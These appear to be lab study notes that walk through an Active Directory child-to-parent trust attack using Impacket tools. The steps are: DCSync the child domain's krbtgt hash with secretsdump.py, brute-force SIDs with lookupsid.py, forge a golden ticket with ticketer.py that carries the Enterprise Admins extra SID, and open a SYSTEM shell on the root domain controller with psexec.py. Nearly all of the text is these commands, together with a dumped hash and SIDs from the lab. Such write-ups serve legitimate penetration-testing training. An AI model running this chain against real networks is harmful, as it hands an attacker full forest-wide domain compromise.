- We need the following bits of information to perform this attack.
	-  The KRBTGT hash for the child domain
	- The SID for the child domain
	- The name of a target user in the child domain (does not need to exist!)
	- The FQDN of the child domain
	- The SID of the Enterprise Admins group of the root domain
- Once we have complete control of the child domain, we can use **secretsdump.py** to DCSync and grab the NTLM hash for the KRBTGT account.

#### Performing DCSync with secretsdump.py
```python
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
![[Pasted image 20260417083410.png]]

- To find the SID of the child domain, use **lookupsid.py** from Impacket toolkit to perform SID brute forcing.

#### Performing SID Brute Forcing using lookupsid.py
```python
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
![[Pasted image 20260417083623.png]]
We can filter out the noise by piping the command output to grep and looking for just the domain SID

```python
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
![[Pasted image 20260417083702.png]]

- Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain `SID S-1-5-21-3842939050-3880317879-2865463114` and attach the RID of the Enterprise Admins group. [Here](https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.

#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```python
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
![[Pasted image 20260417084500.png]]

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

#### Constructing a Golden Ticket using ticketer.py
```python
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

#### Setting the KRB5CCNAME Environment Variable

export KRB5CCNAME=hacker.ccache

#### Getting a SYSTEM shell using Impacket's psexec.py
```python
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
